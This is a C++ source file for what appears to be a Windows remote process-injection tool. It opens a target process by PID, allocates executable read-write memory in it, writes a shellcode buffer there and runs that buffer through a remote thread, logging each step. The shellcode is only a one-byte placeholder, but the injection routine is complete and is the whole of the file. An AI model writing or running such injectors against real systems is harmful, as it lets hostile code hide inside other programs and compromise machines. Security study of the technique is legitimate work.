#include "Logger.h"

// Macros
#define LOG_INFO(msg)   (Logger::getInstance() << msg).logInfo()
#define LOG_DEBUG(msg)  (Logger::getInstance() << msg).logDebug()
#define LOG_WARN(msg)   (Logger::getInstance() << msg).logWarn()
#define LOG_FAILURE(msg)  (Logger::getInstance() << msg).logFailure()
#define LOG_CRITICAL(msg) (Logger::getInstance() << msg).logCritical()

int main(int argc, char* argv[]) {
    //
    DWORD PID, TID = NULL;
    LPVOID rBuffer = NULL;
    HANDLE hThread, hProcess = NULL;

    unsigned char Shell[] = "\x41";

    std::size_t shellSize = sizeof(Shell);

    try {
        //
        if (argc < 2) {
            //
            LOG_FAILURE("Usage: Program.exe <PID>");

            return 1;
        }

        PID = std::stoi(argv[1]);

        LOG_INFO("Trying to open a handle to process " << "(" << PID << ")" << " !");

        hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

        if (hProcess == NULL) {
            //
            LOG_FAILURE("Couldn't get a handle to the process " << "(" << PID << ")" << " !");
            LOG_CRITICAL("Error: " << GetLastError());
            return 1;
        }

        LOG_INFO("Got a handle to the process !\n " << std::hex << hProcess);

        rBuffer = VirtualAllocEx(hProcess, NULL, shellSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        if (rBuffer == NULL) {
            LOG_FAILURE("Failed to allocate memory in the target process.");
            LOG_CRITICAL("Error: " << GetLastError());

            CloseHandle(hProcess);
            return 1;
        }

        LOG_INFO("Allocated " << shellSize << " bytes with PAGE_EXECUTE_READWRITE permissions !");

        if (!WriteProcessMemory(hProcess, rBuffer, Shell, shellSize, NULL)) {
            LOG_FAILURE("Failed to write memory to the process.");
            LOG_CRITICAL("Error: " << GetLastError());

            CloseHandle(hProcess);
            return 1;
        }

        LOG_INFO("Wrote " << shellSize << " bytes to process memory!");

        hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &TID);

        if (hThread == NULL) {
            //
            LOG_FAILURE("Failed to create a remote thread in the process.");
            LOG_CRITICAL("Error: " << GetLastError());

            CloseHandle(hProcess);
            return 1;
        }

        LOG_INFO("Got a handle to the thread " << "(" << TID << ")\n " << std::hex << hThread);

        LOG_INFO("Waiting for thread to finish.");

        WaitForSingleObject(hThread, INFINITE);

        LOG_INFO("Thread finished executing.");

        LOG_INFO("Cleaning up resources.");

        CloseHandle(hThread);
        CloseHandle(hProcess);

        LOG_INFO("Finished successfully.");

    } catch (const std::invalid_argument&) {
        LOG_FAILURE("Invalid PID: Argument is not a number.");
        return 1;
    } catch (const std::out_of_range&) {
        LOG_FAILURE("Invalid PID: Number is out of range.");
        return 1;
    } catch (const std::exception& e) {
        LOG_FAILURE("An unexpected error occurred: " << e.what());
        return 1;
    }

    return 0;
}
